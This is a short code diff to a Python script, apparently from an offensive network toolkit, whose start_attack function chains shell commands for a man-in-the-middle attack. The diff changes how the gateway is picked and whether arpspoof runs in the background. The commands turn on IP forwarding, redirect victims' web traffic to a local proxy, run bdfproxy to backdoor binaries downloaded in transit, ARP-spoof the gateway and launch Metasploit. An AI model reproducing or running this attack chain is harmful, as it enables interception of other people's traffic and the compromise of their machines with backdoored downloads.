@@ -6,12 +6,12 @@ readUserInput = eznhlib.readUserInput
 menu_parser = eznhlib.menu_parser
 popen_background = eznhlib.popen_background
 clean_iptables = eznhlib.clean_iptables
-
+userSelectGateway = eznhlib.userSelectGateway
 def start_attack():
     iface_file = "userinput_interface.txt"
     gw_file = "userinput_gateway.txt"
     iface = readUserInput(iface_file)
-    gw = readUserInput(gw_file)
+    gw = userSelectGateway()
     commands = """
     pkill mitmproxy
     pkill ruby
@@ -20,7 +20,7 @@ def start_attack():
     bdfproxy &
     echo 1 > /proc/sys/net/ipv4/ip_forward
     iptables -t nat -A PREROUTING -i {0} -p tcp --dport 80 -j REDIRECT --to-port 8080
-    arpspoof -i {0} {1} &
+    arpspoof -i {0} {1}
     msfdb start
     msfconsole -r bdfproxy_msf_resource.rc
     """.format(
